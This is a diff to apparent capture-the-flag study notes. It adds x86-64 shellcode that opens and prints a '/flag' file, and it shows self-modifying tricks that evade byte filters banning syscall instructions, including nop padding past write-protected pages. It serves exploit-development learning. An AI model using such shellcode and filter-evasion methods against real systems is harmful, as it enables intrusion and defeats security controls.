@@ -11,6 +11,23 @@ Before each source code:
 .global _start
 _start:
 ```
+Base shellcode:  
+```
+mov     rbx, 0x00000067616c662f
+push    rbx
+mov     rax, 2
+mov     rdi, rsp
+mov     rsi, 0
+syscall
+
+mov     rdi, 1
+mov     rsi, rax
+mov     rdx, 0
+mov     r10, 1000
+mov     rax, 40
+syscall
+```
+
 ## ex 1
 ## ex 2
 ## ex 3
@@ -64,3 +81,30 @@ push    40
 pop     rax             # rax = 40
 syscall                 # sendfile
 ```
+
+## ex 5
++ the shellcode must have NO syscalls
++ forbidden byte sequences: 0f05 (`syscall`), 0f34 (`sysenter`), 80cd (`int`)
+```
+mov     rbx, 0x00000067616c662f
+push    rbx
+mov     rax, 2
+mov     rdi, rsp
+mov     rsi, 0
+inc     BYTE PTR [rip]
+.word   0x050e
+
+mov     rdi, 1
+mov     rsi, rax
+mov     rdx, 0
+mov     r10, 1000
+mov     rax, 40
+inc     BYTE PTR [rip]
+.word   0x050e
+```
+
+## ex 6
++ the shellcode must have NO syscalls
++ forbidden byte sequences: 0f05 (`syscall`), 0f34 (`sysenter`), 80cd (`int`)
++ removing write permissions from first 4096 bytes of shellcode  
+same as 5, but add 4096 nops before actual code
